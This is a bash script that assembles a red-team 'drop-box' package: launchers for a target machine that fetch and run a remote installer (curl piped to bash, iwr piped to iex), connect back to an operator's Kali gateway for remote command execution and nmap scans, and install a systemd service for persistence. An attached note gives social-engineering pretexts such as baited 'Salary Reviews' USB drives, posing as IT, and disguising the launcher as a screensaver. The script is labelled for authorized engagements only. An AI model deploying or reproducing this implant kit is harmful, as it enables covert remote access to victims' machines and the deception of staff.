#!/bin/bash
################################################################################
# Deploy Drop-Box Node to Target Network
# 
# Creates a portable node host that can be deployed on target network
# and controlled from your Kali + OpenCode USB.
#
# Usage: ./deploy-node.sh <gateway-ip> <display-name>
# Example: ./deploy-node.sh 192.168.1.100 "Conference-Room-PC"
################################################################################

set -euo pipefail

GATEWAY_IP="${1:-}"
DISPLAY_NAME="${2:-USB-Node}"

if [[ -z "$GATEWAY_IP" ]]; then
    echo "Usage: $0 <gateway-ip> [display-name]"
    echo "Example: $0 192.168.1.100 \"Conference-Room-PC\""
    exit 1
fi

echo "🗡️  Creating drop-box node deployment package..."
echo ""

# Create deployment directory
DEPLOY_DIR="./node-deploy-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$DEPLOY_DIR"

# Create node host launcher (Linux)
cat > "$DEPLOY_DIR/run-node.sh" << EOF
#!/bin/bash
# Node Host Launcher - Auto-connects to gateway

GATEWAY_HOST="$GATEWAY_IP"
GATEWAY_PORT="18789"
DISPLAY_NAME="$DISPLAY_NAME"

echo "Connecting to gateway at \$GATEWAY_HOST:\$GATEWAY_PORT..."

# Check if OpenCode is installed
if ! command -v opencode &> /dev/null; then
    echo "OpenCode not found. Installing..."
    curl -fsSL https://opencode.ai/install.sh | bash
fi

# Run node host
opencode node run --host "\$GATEWAY_HOST" --port "\$GATEWAY_PORT" --display-name "\$DISPLAY_NAME"
EOF
chmod +x "$DEPLOY_DIR/run-node.sh"

# Create node host launcher (Windows PowerShell)
cat > "$DEPLOY_DIR/run-node.ps1" << EOF
# Node Host Launcher - Windows
# Run as: powershell -ExecutionPolicy Bypass -File run-node.ps1

\$GATEWAY_HOST = "$GATEWAY_IP"
\$GATEWAY_PORT = "18789"
\$DISPLAY_NAME = "$DISPLAY_NAME"

Write-Host "Connecting to gateway at \$GATEWAY_HOST:\$GATEWAY_PORT..."

# Check if OpenCode is installed
if (!(Get-Command opencode -ErrorAction SilentlyContinue)) {
    Write-Host "OpenCode not found. Installing..."
    iwr -useb https://opencode.ai/install.ps1 | iex
}

# Run node host
opencode node run --host \$GATEWAY_HOST --port \$GATEWAY_PORT --display-name \$DISPLAY_NAME
EOF

# Create README for the deployment package
cat > "$DEPLOY_DIR/DEPLOY-README.txt" << EOF
═══════════════════════════════════════════════════════════
  OPENCLAW NODE HOST - DEPLOYMENT PACKAGE
═══════════════════════════════════════════════════════════

This package deploys a node host that connects to your
OpenCode gateway at: $GATEWAY_IP:18789

DEPLOYMENT:

Linux/macOS:
  1. Copy this folder to target machine
  2. Run: bash run-node.sh
  3. Approve on your gateway: opencode nodes approve <id>

Windows:
  1. Copy this folder to target machine
  2. Run: powershell -ExecutionPolicy Bypass -File run-node.ps1
  3. Approve on your gateway

ON YOUR KALI USB GATEWAY:

# List pending nodes
opencode nodes pending

# Approve the node
opencode nodes approve <requestId>

# Verify it's connected
opencode nodes status

# Run commands on the node
opencode nodes run --node "$DISPLAY_NAME" -- whoami
opencode nodes run --node "$DISPLAY_NAME" -- nmap -sV 192.168.1.0/24

═══════════════════════════════════════════════════════════
EOF

# Create systemd service file (for persistent deployment)
cat > "$DEPLOY_DIR/opencode-node.service" << EOF
[Unit]
Description=OpenCode Node Host
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/opencode node run --host $GATEWAY_IP --port 18789 --display-name "$DISPLAY_NAME"
Restart=on-failure
RestartSec=10
User=kali

[Install]
WantedBy=multi-user.target
EOF

# Create installation script for persistent deployment
cat > "$DEPLOY_DIR/install-service.sh" << 'EOF'
#!/bin/bash
# Install node host as systemd service

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

echo "Installing OpenCode node host as systemd service..."

# Copy service file
sudo cp "$SCRIPT_DIR/opencode-node.service" /etc/systemd/system/

# Reload systemd
sudo systemctl daemon-reload

# Enable and start
sudo systemctl enable opencode-node
sudo systemctl start opencode-node

echo "✅ Node host installed and started"
echo "Check status: sudo systemctl status opencode-node"
EOF
chmod +x "$DEPLOY_DIR/install-service.sh"

# Create a simple obfuscation script (for red team ops)
cat > "$DEPLOY_DIR/README-social-engineering.txt" << 'EOF'
═══════════════════════════════════════════════════════════
  SOCIAL ENGINEERING NOTES (RED TEAM ONLY)
═══════════════════════════════════════════════════════════

For authorized red team engagements only.

DEPLOYMENT IDEAS:

1. "USB Drive Found" - Leave labeled USB in common area
   - Label: "Q4 Financials" or "Salary Reviews 2026"
   - Include autorun (Windows) or instructions (Linux)

2. "Conference Room Drop" - Deploy during off-hours
   - Connect to conference room PC
   - Run node host service
   - Remote access established

3. "IT Maintenance" - Pose as IT during engagement
   - "Updating systems" - run installer
   - Leave node host running

4. "Gift USB" - Social engineering classic
   - Branded USB with company logo
   - Pre-loaded with "screensaver" that runs node

⚠️ LEGAL WARNING:
Only use these techniques with explicit written authorization
in your engagement scope. Unauthorized access is illegal.

═══════════════════════════════════════════════════════════
EOF

echo ""
echo "✅ Deployment package created: $DEPLOY_DIR"
echo ""
echo "Contents:"
ls -la "$DEPLOY_DIR"
echo ""
echo "═══════════════════════════════════════════════════════════"
echo "NEXT STEPS:"
echo "═══════════════════════════════════════════════════════════"
echo ""
echo "1. Copy $DEPLOY_DIR to target machine"
echo "2. Run appropriate launcher for the OS"
echo "3. On your Kali USB gateway, approve the node:"
echo "   opencode nodes pending"
echo "   opencode nodes approve <requestId>"
echo ""
echo "4. Control the node:"
echo "   opencode nodes run --node '$DISPLAY_NAME' -- <command>"
echo ""
echo "═══════════════════════════════════════════════════════════"
